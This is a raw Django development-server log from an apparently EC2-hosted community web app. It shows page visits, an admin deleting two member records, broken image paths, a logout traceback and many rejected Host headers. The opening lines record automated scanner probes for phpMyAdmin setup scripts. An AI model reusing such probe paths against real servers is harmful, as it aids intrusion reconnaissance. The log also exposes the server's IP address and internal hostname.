Bad Request: //phpMyAdmin/scripts/setup.php
[13/Dec/2018 12:38:05] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 400 62992
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: //phpmyadmin/scripts/setup.php
[13/Dec/2018 12:38:05] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 400 62992
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: //pma/scripts/setup.php
[13/Dec/2018 12:38:05] "GET //pma/scripts/setup.php HTTP/1.1" 400 62915
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: //myadmin/scripts/setup.php
[13/Dec/2018 12:38:05] "GET //myadmin/scripts/setup.php HTTP/1.1" 400 62959
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 13:03:23] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 13:06:39] "GET / HTTP/1.0" 400 62438
[13/Dec/2018 13:15:46] "GET /requests HTTP/1.1" 200 5853
[13/Dec/2018 13:15:46] "GET /media/media/logo.png HTTP/1.1" 304 0
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 13:29:22] "GET / HTTP/1.1" 400 62427
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 13:31:58] "GET / HTTP/1.1" 400 62422
Not Found: /robots.txt
[13/Dec/2018 14:16:45] "GET /robots.txt HTTP/1.1" 404 5961
[13/Dec/2018 14:16:49] "GET /profile/3 HTTP/1.1" 302 0
[13/Dec/2018 14:16:52] "GET /accounts/login/?next=/profile/3 HTTP/1.1" 200 2576
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 14:25:32] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 14:30:11] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 14:38:41] "GET / HTTP/1.1" 400 62437
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 15:35:23] "GET / HTTP/1.0" 400 62438
[13/Dec/2018 15:37:17] "GET /login/ HTTP/1.1" 302 0
[13/Dec/2018 15:37:18] "GET / HTTP/1.1" 200 13948
[13/Dec/2018 15:37:18] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[13/Dec/2018 15:37:18] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[13/Dec/2018 15:37:19] "GET /logo.jpeg HTTP/1.1" 404 5958
[13/Dec/2018 15:37:42] "GET /community/4/members_list HTTP/1.1" 200 8316
Not Found: /community/4/logo.jpeg
[13/Dec/2018 15:37:43] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[13/Dec/2018 15:37:46] "GET /community/4/ HTTP/1.1" 200 12573
[13/Dec/2018 15:37:54] "GET /admin HTTP/1.1" 301 0
[13/Dec/2018 15:37:54] "GET /admin/ HTTP/1.1" 302 0
[13/Dec/2018 15:37:55] "GET /admin/ HTTP/1.1" 302 0
[13/Dec/2018 15:37:55] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[13/Dec/2018 15:37:56] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[13/Dec/2018 15:37:56] "GET /static/admin/css/base.css HTTP/1.1" 304 0
[13/Dec/2018 15:37:56] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[13/Dec/2018 15:37:57] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
[13/Dec/2018 15:37:57] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
Not Found: /favicon.ico
[13/Dec/2018 15:37:58] "GET /favicon.ico HTTP/1.1" 404 5964
[13/Dec/2018 15:37:59] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[13/Dec/2018 15:37:59] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[13/Dec/2018 15:37:59] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[13/Dec/2018 15:38:04] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[13/Dec/2018 15:38:05] "GET /admin/ HTTP/1.1" 200 12215
[13/Dec/2018 15:38:05] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
[13/Dec/2018 15:38:06] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
[13/Dec/2018 15:38:06] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[13/Dec/2018 15:38:06] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
[13/Dec/2018 15:38:16] "GET /admin/togther/members/ HTTP/1.1" 200 5990
[13/Dec/2018 15:38:17] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[13/Dec/2018 15:38:17] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /static/admin/js/core.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:38:17] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:17] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:18] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
[13/Dec/2018 15:38:20] "GET /admin/togther/members/9/change/ HTTP/1.1" 200 6241
[13/Dec/2018 15:38:20] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
[13/Dec/2018 15:38:20] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:38:20] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
[13/Dec/2018 15:38:21] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[13/Dec/2018 15:38:24] "GET /admin/togther/members/ HTTP/1.1" 200 5990
[13/Dec/2018 15:40:47] "GET /admin/togther/members/ HTTP/1.1" 200 5990
[13/Dec/2018 15:40:47] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:40:51] "GET /admin/togther/ HTTP/1.1" 200 6500
[13/Dec/2018 15:40:55] "GET /admin/togther/admins/ HTTP/1.1" 200 4579
[13/Dec/2018 15:40:55] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:40:58] "GET /admin/togther/ HTTP/1.1" 200 6500
[13/Dec/2018 15:41:02] "GET /admin/togther/members/ HTTP/1.1" 200 5990
[13/Dec/2018 15:41:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:41:16] "GET /admin/togther/members/8/change/ HTTP/1.1" 200 6241
[13/Dec/2018 15:41:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:41:19] "GET /admin/togther/members/8/delete/ HTTP/1.1" 200 3239
[13/Dec/2018 15:41:20] "GET /static/admin/js/cancel.js HTTP/1.1" 200 410
[13/Dec/2018 15:41:22] "POST /admin/togther/members/8/delete/ HTTP/1.1" 302 0
[13/Dec/2018 15:41:22] "GET /admin/togther/members/ HTTP/1.1" 200 5917
[13/Dec/2018 15:41:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:41:23] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[13/Dec/2018 15:41:25] "GET /admin/togther/members/6/change/ HTTP/1.1" 200 6241
[13/Dec/2018 15:41:25] "GET /admin/togther/members/6/change/ HTTP/1.1" 200 6241
[13/Dec/2018 15:41:26] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 15:41:28] "GET /admin/togther/members/6/delete/ HTTP/1.1" 200 3239
[13/Dec/2018 15:41:30] "POST /admin/togther/members/6/delete/ HTTP/1.1" 302 0
[13/Dec/2018 15:41:31] "GET /admin/togther/members/ HTTP/1.1" 200 5684
[13/Dec/2018 15:41:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 15:45:37] "GET / HTTP/1.0" 400 62436
[13/Dec/2018 16:39:28] "GET /admin/togther/members/ HTTP/1.1" 200 5524
[13/Dec/2018 16:39:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 16:47:08] "GET /admin/togther/members/ HTTP/1.1" 200 5524
[13/Dec/2018 16:47:08] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[13/Dec/2018 16:58:47] "GET / HTTP/1.1" 200 13159
[13/Dec/2018 16:58:48] "GET /media/media/logo.png HTTP/1.1" 200 11255
[13/Dec/2018 16:58:51] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[13/Dec/2018 16:58:53] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[13/Dec/2018 16:58:55] "GET /logo.jpeg HTTP/1.1" 404 5987
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Performing system checks...

System check identified no issues (0 silenced).
December 14, 2018 - 18:31:17
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[14/Dec/2018 18:44:10] "GET / HTTP/1.1" 200 13159
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:44:21] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:44:21] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:44:31] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:44:31] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:45:20] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:45:20] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:45:21] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:45:22] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:45:23] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:45:23] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:47:13] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:47:14] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:47:38] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:47:38] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:48:20] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:48:20] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:51:31] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:51:31] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:51:34] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:51:34] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:51:39] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:51:40] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[14/Dec/2018 18:51:48] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[14/Dec/2018 18:51:48] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[14/Dec/2018 18:51:53] "GET /community/3 HTTP/1.1" 301 0
[14/Dec/2018 18:51:53] "GET /community/3/ HTTP/1.1" 200 10877
Not Found: /community/3/logo.jpeg
[14/Dec/2018 18:51:54] "GET /community/3/logo.jpeg HTTP/1.1" 404 5994
[14/Dec/2018 18:51:56] "GET /community/3/members_list HTTP/1.1" 200 6328
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 18:55:11] "GET / HTTP/1.0" 400 62415
[14/Dec/2018 19:10:52] "GET / HTTP/1.1" 200 13948
[14/Dec/2018 19:10:53] "GET /media/media/logo.png HTTP/1.1" 200 11255
[14/Dec/2018 19:10:57] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[14/Dec/2018 19:11:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[14/Dec/2018 19:11:02] "GET /logo.jpeg HTTP/1.1" 404 5958
Internal Server Error: /dashboard/logout
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
TypeError: dashboard() got an unexpected keyword argument 'data'
[14/Dec/2018 19:29:51] "GET /dashboard/logout HTTP/1.1" 500 62748
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 19:49:05] "GET / HTTP/1.1" 400 62411
Invalid HTTP_HOST header: '1.2.3.4'. You may need to add '1.2.3.4' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 20:20:54] "GET / HTTP/1.0" 400 62035
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 20:22:49] "GET / HTTP/1.0" 400 62412
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 20:30:06] "GET / HTTP/1.0" 400 62696
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 20:38:45] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 21:22:51] "GET / HTTP/1.0" 400 62413
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 21:25:25] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 21:29:05] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 22:27:16] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 23:20:33] "GET / HTTP/1.0" 400 62403
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 23:34:02] "HEAD / HTTP/1.1" 400 62133
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 23:41:12] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 23:50:51] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[14/Dec/2018 23:57:42] "GET / HTTP/1.1" 400 62403
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 00:18:17] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
[15/Dec/2018 00:34:01] "GET / HTTP/1.0" 400 62416
Bad Request: /
[15/Dec/2018 00:34:01] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 01:34:24] "GET / HTTP/1.1" 400 62405
[15/Dec/2018 01:40:55] "GET / HTTP/1.1" 200 13948
[15/Dec/2018 01:40:56] "GET /media/media/logo.png HTTP/1.1" 304 0
[15/Dec/2018 01:40:56] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 01:40:56] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[15/Dec/2018 01:40:57] "GET /logo.jpeg HTTP/1.1" 404 5958
[15/Dec/2018 01:41:03] "GET /profile/4 HTTP/1.1" 200 23000
[15/Dec/2018 01:41:03] "GET /media/media/logo.png HTTP/1.1" 304 0
[15/Dec/2018 01:41:04] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 01:41:04] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /profile/logo.jpeg
[15/Dec/2018 01:41:05] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[15/Dec/2018 02:08:12] "GET / HTTP/1.1" 200 13948
[15/Dec/2018 02:08:12] "GET /media/media/logo.png HTTP/1.1" 200 11255
[15/Dec/2018 02:08:13] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[15/Dec/2018 02:08:14] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 02:25:36] "GET / HTTP/1.0" 400 62413
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 02:49:30] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 02:49:35] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 03:29:23] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 03:41:06] "GET / HTTP/1.0" 400 62415
[15/Dec/2018 04:01:26] "GET /profile/4 HTTP/1.1" 200 23000
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 04:08:30] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 04:32:31] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 04:58:12] "GET / HTTP/1.1" 400 62402
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 05:04:03] "GET / HTTP/1.1" 400 62524
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 05:26:54] "GET / HTTP/1.1" 400 62404
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 06:47:06] "GET / HTTP/1.1" 400 62403
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 07:34:35] "GET / HTTP/1.1" 400 62402
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:38:08] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:38:08] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
[15/Dec/2018 07:38:11] "GET /community/3/ HTTP/1.1" 200 10877
[15/Dec/2018 07:38:12] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 07:39:38] "GET /community/3/ HTTP/1.1" 200 10877
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:39:42] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:39:42] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /.
[15/Dec/2018 07:39:44] "GET /. HTTP/0.0" 400 62425
[15/Dec/2018 07:40:34] "GET /community/3/ HTTP/1.1" 200 10877
[15/Dec/2018 07:41:31] "GET /community/3/members_list HTTP/1.1" 200 6328
[15/Dec/2018 07:43:46] "GET /community/3/members_list HTTP/1.1" 200 6328
